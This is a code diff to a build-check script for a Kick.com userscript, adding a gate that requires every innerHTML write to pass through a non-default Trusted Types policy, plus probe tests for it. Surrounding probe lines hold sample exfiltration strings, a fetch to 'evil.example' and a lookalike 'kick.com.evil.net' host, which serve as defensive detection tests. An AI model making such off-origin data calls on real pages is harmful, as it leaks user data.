@@ -111,6 +111,12 @@ const importGapsIn = (body) => STORAGE_STORES
   .filter((reference) => !String(body).includes(reference));
 const importGaps = importGapsIn(importBody);
 
+/** Any `innerHTML =` in a shipped bundle that is not handed to the policy. */
+const bareHTMLWrite = /\.innerHTML\s*=(?!\s*trustedHTML\()/g;
+const unroutedHTML = bundleTargets
+  .filter(([, bundleSource]) => bareHTMLWrite.test(bundleSource) && (bareHTMLWrite.lastIndex = 0) === 0)
+  .map(([name]) => name);
+
 const checks = [
   // The detail goes in the label, not the value: this loop treats any truthy
   // value as a pass, so `gaps.length === 0 || gaps.join()` would report success
@@ -123,6 +129,13 @@ const checks = [
   ['targets Kick HTTPS', source.includes('// @match        https://kick.com/*')],
   ['contains no remote code dependency', !/@require\s|@resource\s/i.test(source)],
   ['ships settings UI', source.includes('data-kf-settings-shell')],
+  // If kick.com ever sends `require-trusted-types-for 'script'`, a bare
+  // innerHTML write throws and this build's interface stops rendering. Every
+  // write must go through the policy, and the policy must never be 'default',
+  // which would vouch for every other script on the page.
+  [`every innerHTML write is policy-routed${unroutedHTML.length ? ` — ${unroutedHTML.length} bare in ${unroutedHTML[0]}` : ''}`,
+    unroutedHTML.length === 0 && bundleTargets.every(([, bundleSource]) => bundleSource.includes("createPolicy('kick-focus'")
+      && !/createPolicy\(\s*['"]default['"]/.test(bundleSource))],
   // Typing an emote name must stay a name. The wire form `[emote:id:name]` is
   // entitlement, and no path here may compose one, fall back to writing raw
   // text into Kick's editor, or send anything.
@@ -537,6 +550,10 @@ const redProbes = [
   ['exfil gate would catch an off-origin api call', EXFIL_REGEX.test('fetch(`https://evil.example/api/v1/log`)')],
   ['exfil gate would catch a lookalike host', EXFIL_REGEX.test('https://kick.com.evil.net/api/v1/log')],
   ['shadow-a11y gate would reject a bundle with no host-keyed rules', !shadowAccessibilityWired('')],
+  ['trusted-types gate would catch a bare innerHTML write',
+    /\.innerHTML\s*=(?!\s*trustedHTML\()/.test('node.innerHTML = `<b>x</b>`;')],
+  ['trusted-types gate accepts a policy-routed write',
+    !/\.innerHTML\s*=(?!\s*trustedHTML\()/.test('node.innerHTML = trustedHTML(`<b>x</b>`);')],
   // The import-coverage gate is derived from the registry, so prove it reports
   // gaps rather than vacuously agreeing with whatever the function happens to
   // contain — an empty body must come back as every store missing.
